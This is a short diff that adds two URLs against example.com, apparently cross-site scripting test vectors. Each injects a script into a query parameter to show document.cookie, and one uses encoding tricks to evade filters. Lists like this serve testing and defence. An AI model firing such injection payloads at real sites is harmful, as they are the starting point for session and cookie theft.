@@ -1,0 +1,2 @@
+http://www.example.com/login.php?last_login=123%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/colors.php?color=&quot;&gt;&lt;%73cript&gt;alert(document.cookie);&lt;/%73cript&gt;
